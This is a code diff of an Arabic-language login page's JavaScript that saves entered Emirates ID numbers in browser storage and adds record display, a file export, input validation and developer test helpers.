+            detailsDiv.className = 'record-details';
+            detailsDiv.innerHTML = `
+                <h4><i class="fas fa-info-circle"></i> تفاصيل السجل المحفوظ</h4>
+                
+                <div class="id-preview">
+                    ${record.idNumber}
+                </div>
+                
+                <div class="details-grid">
+                    <div class="detail-item">
+                        <div class="detail-label">تاريخ الحفظ</div>
+                        <div class="detail-value">${record.date}</div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-label">وقت الحفظ</div>
+                        <div class="detail-value">${record.time}</div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-label">حالة التذكر</div>
+                        <div class="detail-value">${record.rememberMe ? 'مفعل ✓' : 'غير مفعل ✗'}</div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-label">رقم فريد</div>
+                        <div class="detail-value">${record.id.substring(0, 15)}...</div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-label">بادئة الهوية</div>
+                        <div class="detail-value">${record.idDetails.prefix}</div>
+                    </div>
+                    
+                    <div class="detail-item">
+                        <div class="detail-label">سنة الميلاد</div>
+                        <div class="detail-value">${record.idDetails.birthYear}</div>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 15px; text-align: center;">
+                    <button onclick="viewAllRecords()" style="
+                        background: #0D98BA;
+                        color: white;
+                        border: none;
+                        padding: 8px 15px;
+                        border-radius: 5px;
+                        cursor: pointer;
+                        font-size: 14px;
+                    ">
+                        <i class="fas fa-eye"></i> عرض جميع السجلات
+                    </button>
+                    
+                    <button onclick="exportRecords()" style="
+                        background: #00ac75;
+                        color: white;
+                        border: none;
+                        padding: 8px 15px;
+                        border-radius: 5px;
+                        cursor: pointer;
+                        font-size: 14px;
+                        margin-right: 10px;
+                    ">
+                        <i class="fas fa-download"></i> تصدير البيانات
+                    </button>
+                </div>
+            `;
+            
+            const form = document.getElementById('loginForm');
+            form.parentNode.insertBefore(detailsDiv, form.nextSibling);
+        }
+
+        // === دوال إضافية ===
+        window.viewAllRecords = function() {
+            window.location.href = 'view-data.html';
         };
-        document.body.appendChild(helpButton);
+        
+        window.exportRecords = function(format = 'json') {
+            const exportData = idStorage.exportData(format);
+            
+            const blob = new Blob([exportData.content], { type: exportData.mimeType });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `uae_id_records_${new Date().toISOString().slice(0,10)}.${exportData.extension}`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            showMessage(`✅ تم تصدير ${idStorage.getRecordCount()} سجلاً إلى ملف ${exportData.extension.toUpperCase()}`, 'success');
+        };
+
+        // === تحميل البيانات المحفوظة ===
+        window.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 صفحة التقديم جاهزة');
+            
+            // تحميل آخر رقم هوية تم إدخاله
+            const lastId = localStorage.getItem('last_entered_id');
+            const autoRemember = localStorage.getItem('auto_remember');
+            
+            if (lastId && autoRemember === 'true') {
+                usernameInput.value = lastId;
+                document.getElementById('rememberme').checked = true;
+                
+                showMessage(
+                    `تم تحميل آخر رقم هوية تم إدخاله: ${lastId}`,
+                    'info',
+                    3000
+                );
+            }
+            
+            // عرض عدد السجلات المحفوظة
+            const recordCount = idStorage.getRecordCount();
+            if (recordCount > 0) {
+                const statsLink = document.querySelector('a[href="view-data.html"]');
+                if (statsLink) {
+                    statsLink.innerHTML += ` (${recordCount})`;
+                }
+                
+                console.log(`📊 لديك ${recordCount} سجلاً محفوظاً`);
+            }
+            
+            // إضافة مؤشر الكتابة التلقائي
+            usernameInput.addEventListener('input', function(e) {
+                const value = e.target.value.replace(/\D/g, '');
+                if (value.length <= 15) {
+                    e.target.value = value;
+                    
+                    // إضافة فواصل للقراءة
+                    if (value.length > 0) {
+                        const formatted = value.replace(/(\d{3})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4');
+                        e.target.setAttribute('data-formatted', formatted);
+                    }
+                }
+            });
+            
+            // التحقق أثناء الكتابة
+            usernameInput.addEventListener('keyup', function() {
+                const value = this.value.replace(/\D/g, '');
+                
+                if (value.length === 15) {
+                    const validation = idStorage.validateID(value);
+                    if (validation.isValid) {
+                        this.style.borderColor = '#00ac75';
+                        this.style.boxShadow = '0 0 0 3px rgba(0, 172, 117, 0.1)';
+                    } else {
+                        this.style.borderColor = '#ff4757';
+                        this.style.boxShadow = '0 0 0 3px rgba(255, 71, 87, 0.1)';
+                    }
+                } else {
+                    this.style.borderColor = '';
+                    this.style.boxShadow = '';
+                }
+            });
+            
+            // أدوات المطورين
+            console.log('🔧 أدوات التطوير المتاحة:');
+            console.log('- idStorage.getRecords() - عرض السجلات');
+            console.log('- idStorage.exportData() - تصدير البيانات');
+            console.log('- idStorage.clearRecords() - مسح السجلات');
+            console.log('- testSave() - اختبار الحفظ');
+            
+            // زر الاختبار السريع
+            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+                const testButton = document.createElement('button');
+                testButton.innerHTML = '<i class="fas fa-vial"></i> اختبار';
+                testButton.style.cssText = `
+                    position: fixed;
+                    bottom: 20px;
+                    right: 20px;
+                    padding: 8px 12px;
+                    background: #607d8b;
+                    color: white;
+                    border: none;
+                    border-radius: 5px;
+                    cursor: pointer;
+                    font-size: 12px;
+                    z-index: 1000;
+                    opacity: 0.8;
+                `;
+                testButton.onclick = function() {
+                    const testId = '784' + Math.floor(100000000000 + Math.random() * 900000000000).toString().substr(0, 12);
+                    usernameInput.value = testId;
+                    document.getElementById('rememberme').checked = true;
+                    showMessage(`تم إدخال رقم اختبار: ${testId}`, 'info', 3000);
+                };
+                document.body.appendChild(testButton);
+            }
+        });
+
+        // === دالة اختبار الحفظ ===
+        window.testSave = function() {
+            const testId = '784199012345678';
+            usernameInput.value = testId;
+            
+            // محاكاة إرسال النموذج
+            setTimeout(() => {
+                loginForm.dispatchEvent(new Event('submit'));
+            }, 500);
+            
+            console.log('🧪 جاري اختبار الحفظ...');
+        };
 
     </script>
 </body>
